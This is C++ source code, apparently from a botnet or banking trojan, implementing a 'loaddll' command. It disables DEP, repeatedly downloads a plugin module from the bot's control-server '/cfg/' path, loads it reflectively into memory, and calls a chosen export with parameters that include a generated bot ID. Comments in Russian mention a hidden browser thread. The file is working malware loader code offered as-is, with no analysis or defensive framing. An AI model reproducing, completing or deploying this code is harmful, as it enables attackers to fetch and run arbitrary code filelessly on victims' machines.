#include"ComandLoadDLL.h"


typedef struct
{
	char* Server;
	char* FuncNam;
	char* Param1;
	char* Param2;
	char* Param3;
	char* Param4;
} VoidData, * PVoidData;


DWORD WINAPI RunLoaderThread( LPVOID lpData )
{
	DisableDEP();

	if ( !lpData )
	{
		return 0;
	}

	PVoidData pData = (PVoidData)lpData;

	char *Host = GetCurrentHost();

	if ( Host == NULL )
	{
		return 0;
	}

	char SBFile[] = {'/','c','f','g','/',0};

	char SBUrl[256];

	m_lstrcpy( SBUrl, Host );
	m_lstrcat( SBUrl, SBFile );
	m_lstrcat( SBUrl, pData->Server );


	LPBYTE BotModule   = NULL;
	DWORD dwModuleSize = 0;

	while ( ( BotModule = (LPBYTE)DownloadPlugin( SBUrl ) ) == NULL ) 
	{
		pSleep( 1000 * 60 * 1 );
	}
	HMEMORYMODULE hLib = MemoryLoadLibrary( BotModule );

	char Uid[100];
	m_memset(Uid,0,100);
	GenerateUid( Uid );
	if(pData->Param1!=NULL &&pData->Param1[0]=='U'&&pData->Param1[1]=='\0')
	{
		STR::Free(pData->Param1);
		pData->Param1=STR::New(Uid);
	}
	if(pData->Param2!=NULL &&pData->Param2[0]=='U'&&pData->Param2[1]=='\0')
	{
		STR::Free(pData->Param2);
		pData->Param2=STR::New(Uid);
	}
	if(pData->Param3!=NULL &&pData->Param3[0]=='U'&&pData->Param3[1]=='\0')
	{
		STR::Free(pData->Param3);
		pData->Param3=STR::New(Uid);
	}
	if(pData->Param4!=NULL &&pData->Param4[0]=='U'&&pData->Param4[1]=='\0')
	{
		STR::Free(pData->Param4);
		pData->Param4=STR::New(Uid);
	}


	if (pData->Param1==NULL)
	{
		typedef void (WINAPI *PStartClient)( );	
		PStartClient Func=(PStartClient)MemoryGetProcAddress( hLib, pData->FuncNam );
		Func();
	}
	else
	if (pData->Param2==NULL)
	{
		typedef void (WINAPI *PStartClient)(char * Param1 );
		PStartClient Func=(PStartClient)MemoryGetProcAddress( hLib, pData->FuncNam );
		Func(pData->Param1);
	}
	else
	if (pData->Param3==NULL)
	{
		typedef void (WINAPI *PStartClient)(char * Param1,char * Param2 );	
		PStartClient Func=(PStartClient)MemoryGetProcAddress( hLib, pData->FuncNam );
		Func(pData->Param1,pData->Param2);
	}
	else
	if (pData->Param4==NULL)
	{
		typedef void (WINAPI *PStartClient)( char * Param1,char * Param2,char * Param3);
		PStartClient Func=(PStartClient)MemoryGetProcAddress( hLib, pData->FuncNam );
		Func(pData->Param1,pData->Param2,pData->Param3);
	}
	else
	{
		typedef void (WINAPI *PStartClient)( char * Param1,char * Param2,char * Param3,char * Param4);	
		PStartClient Func=(PStartClient)MemoryGetProcAddress( hLib, pData->FuncNam );
		Func(pData->Param1,pData->Param2,pData->Param3,pData->Param4);
	}
	STR::Free(pData->Param1);
	STR::Free(pData->Param2);
	STR::Free(pData->Param3);
	STR::Free(pData->Param4);
	
	return 0;

}
//loaddll url funcname parametrs до 4х штук
//loaddll plug.blug|FuncRun|234|U|2|Ppp|
bool ExecuteAllCommand(LPVOID Manager, PCHAR Command, PCHAR Args)
{
	// Запуск потока скрытого браузера
	PVoidData V = CreateStruct(VoidData);
	V->Server	= STR::GetLeftStr(Args, "|");
	V->FuncNam	=GetTextBetween(Args,"|","|");
	V->Param1	=GetTextBetween(Args,"|","|");
	V->Param2	=GetTextBetween(Args,"|","|");
	V->Param3	=GetTextBetween(Args,"|","|");
	V->Param4	=GetTextBetween(Args,"|","|");

	
	StartThread(RunLoaderThread, V);
	Sleep(1000*60*60);
	return false;

}